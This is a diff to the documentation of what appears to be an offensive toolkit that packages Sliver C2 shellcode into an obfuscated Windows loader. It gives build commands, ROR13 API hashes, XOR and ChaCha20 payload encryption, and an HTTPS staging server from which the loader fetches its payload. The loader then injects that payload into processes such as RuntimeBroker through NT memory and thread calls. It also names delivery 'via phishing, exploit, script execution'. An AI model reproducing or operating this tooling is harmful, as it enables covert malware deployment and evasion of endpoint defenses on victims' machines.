@@ -132,10 +132,9 @@ A `.spec` file is a set of directives processed in order:
 ```
 x64:
     load "bin/loader.x64.o"
-        make pic +gofirst
+        make pic +gofirst +optimize
 
-    load "bin/services.x64.o"
-        merge
+    dfr "resolve" "ror13"
 
     generate $MASK 128
 
@@ -146,8 +145,8 @@ x64:
 ```
 
 This is a script telling Crystal Palace:
-1. Load `loader.x64.o` as the primary object, make it PIC, put `go()` at offset 0
-2. Merge `services.x64.o` into the code region
+1. Load `loader.x64.o` as the primary object (unity build — all C sources compiled in), make it PIC, put `go()` at offset 0
+2. `dfr "resolve" "ror13"` — no-op in PalaceKit (ROR13 is implemented directly in the C code)
 3. Generate 128 random bytes stored as `$MASK`
 4. Push the `$DLL` variable (your Sliver shellcode) onto the stack...
 5. ...XOR it with `$MASK`...
@@ -280,9 +279,9 @@ CrystalKit serve
           ↓
 Deliver loader.exe to target
   • Runs on Windows x64
-  • Fetches payload.enc via WinHTTP
+  • Fetches payload.enc via Go net/http (InsecureSkipVerify; payload integrity via AEAD)
   • Decrypts with ChaCha20-Poly1305 (exits if tampered)
-  • Finds/spawns host process (RuntimeBroker, WerFault, dllhost, notepad)
+  • Finds/spawns host process (RuntimeBroker, SgrmBroker, WerFault, dllhost, notepad)
   • NtAllocateVirtualMemory(host, RW) → NtWriteVirtualMemory → NtProtectVirtualMemory(RX)
   • NtCreateThreadEx(host, shellcode_entry)
   • Loader exits cleanly
@@ -451,7 +450,7 @@ Output:
 
 What happened:
 - `loader.spec` was evaluated
-- All 8 COFF objects were merged and linked
+- 6 COFF objects were merged and linked (loader.x64.o is a unity build of all C sources compiled via src/unity.c)
 - A 128-byte random XOR key was generated
 - The shellcode was XOR-encrypted and stored in the `dll` section
 - A PICO blob (two no-op stubs) was built and stored in the `pico` section
@@ -503,16 +502,19 @@ After changing targets or Windows versions, verify that the ROR13 hashes in `src
 ```bash
 ./palacekit gen-hashes
 
-NtAllocateVirtualMemory      0xD33BCABD
-NtProtectVirtualMemory       0x8C394D89
-NtCreateThreadEx             0x4D1DEB74
-NtWaitForSingleObject        0xAE06C1B2
-NtFreeVirtualMemory          0xDB63B5AB
-RtlExitUserThread            0xFF7F061A
-VirtualAlloc                 0x91AFCA54
-VirtualProtect               0x7946C61B
-VirtualFree                  0x030633AC
-LoadLibraryA                 0xEC0E4E8E
+NtAllocateVirtualMemory              0xD33BCABD
+NtProtectVirtualMemory               0x8C394D89
+NtCreateThreadEx                     0x4D1DEB74
+NtWaitForSingleObject                0xAE06C1B2
+NtFreeVirtualMemory                  0xDB63B5AB
+RtlExitUserThread                    0xFF7F061A
+VirtualAlloc                         0x91AFCA54
+VirtualProtect                       0x7946C61B
+VirtualFree                          0x030633AC
+LoadLibraryA                         0xEC0E4E8E
+GetProcAddress                       0x7C0DFCAA
+LoadLibraryW                         0xEC0E4EA4
+ExitThread                           0x60E0CEEF
 ```
 
 ROR13 hashes are computed from the function name string and are the same on all Windows versions (the names don't change). If a function isn't found, `patch_resolve` returns NULL and the call will crash — use `gen-hashes` to confirm names are correct.
@@ -538,22 +540,26 @@ cd Crystal-Palace-Kit/crystalkit
 
 ./crystalkit inject \
     --shellcode /tmp/implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --output build/ \
     --garble \
     --serve
 ```
 
+> **`--url` only needs `https://IP:PORT` when using `--serve`.** A random path is generated
+> automatically and baked into `loader.exe`. The staging URL is printed in the output — use
+> that exact URL to verify connectivity, but `loader.exe` already has it compiled in.
+
 What this produces:
 - `build/payload.enc` — ChaCha20-Poly1305 encrypted shellcode
 - `build/loader.exe` — Windows x64 EXE with key+URL baked in (garble-obfuscated)
-- Starts one-shot HTTPS server at `https://192.168.1.10:8443/p`
+- One-shot HTTPS server at a randomly generated URL (printed in output)
 
 #### Step 3 — Deliver `loader.exe` to target
 
 Deliver via phishing, exploit, script execution, etc. When executed:
 
-1. Connects to `https://192.168.1.10:8443/p` via WinHTTP (ignores certificate errors)
+1. Connects to the staging URL (baked in at build time) via Go net/http (InsecureSkipVerify; payload integrity protected by ChaCha20-Poly1305 AEAD)
 2. Decrypts payload with ChaCha20-Poly1305 — exits immediately if decryption fails (tamper detection)
 3. Searches for a host process in this order:
    - `RuntimeBroker.exe`
@@ -577,7 +583,7 @@ For the Crystal Palace-hardened loader (requires `crystalpalace.jar` OR PalaceKi
 ```bash
 ./crystalkit implant \
     --shellcode /tmp/implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 ```
 
@@ -878,7 +884,7 @@ go build -o crystalkit ./cmd/crystalkit
 # Go process injector (no Crystal Palace needed)
 ./crystalkit inject \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --output build/ \
     --garble \
     --serve
@@ -886,7 +892,7 @@ go build -o crystalkit ./cmd/crystalkit
 # Crystal Palace PICO implant (requires crystalpalace.jar or PalaceKit)
 ./crystalkit implant \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --serve
 
 # Post-ex DLL wrapping (requires Crystal Palace)
@@ -895,7 +901,7 @@ go build -o crystalkit ./cmd/crystalkit
     --output build/postex.pico
 
 # Serve an already-built payload
-./crystalkit stage --serve \
+./crystalkit serve \
     --payload build/payload.enc \
     --port 8443
 
@@ -915,15 +921,19 @@ go build -o crystalkit ./cmd/crystalkit
 ```
 Source C files                     COFF objects              PalaceKit
                                                             (Go process)
-loader.c     ──[mingw-gcc -c]──▶ loader.x64.o  ──┐
-services.c   ──[mingw-gcc -c]──▶ services.x64.o──┤
-pico.c       ──[mingw-gcc -c]──▶ pico.x64.o    ──┤         ┌──────────────┐
-hooks.c      ──[mingw-gcc -c]──▶ hooks.x64.o   ──┼────────▶│ COFF Parser  │
-mask.c       ──[mingw-gcc -c]──▶ mask.x64.o    ──┤         │ Reloc Engine │
-spoof.c      ──[mingw-gcc -c]──▶ spoof.x64.o   ──┤         │ Spec Eval    │
-cfg.c        ──[mingw-gcc -c]──▶ cfg.x64.o     ──┤         │ PICO Builder │
-cleanup.c    ──[mingw-gcc -c]──▶ cleanup.x64.o ──┘         └──────┬───────┘
-                                                                   │
+unity.c ─────────────────────▶ loader.x64.o    ──┐
+  (includes loader.c                               │
+   services.c, pico.c,                             │
+   hooks.c, mask.c,                                │         ┌──────────────┐
+   spoof.c, cfg.c,                                 ├────────▶│ COFF Parser  │
+   cleanup.c)                                      │         │ Reloc Engine │
+                                                   │         │ Spec Eval    │
+pico.c    ──[mingw-gcc -c]──▶ pico.x64.o     ──┤         │ PICO Builder │
+hooks.c   ──[mingw-gcc -c]──▶ hooks.x64.o   ──┤         └──────┬───────┘
+spoof.c   ──[mingw-gcc -c]──▶ spoof.x64.o   ──┤
+cfg.c     ──[mingw-gcc -c]──▶ cfg.x64.o     ──┤
+cleanup.c ──[mingw-gcc -c]──▶ cleanup.x64.o ──┘
+
 loader.spec ─────────────────────────────────────────────────────▶│
 pico.spec ───────────────────────────────────────────────────────▶│
 implant.bin (Sliver shellcode) ──────────────────────────────────▶│
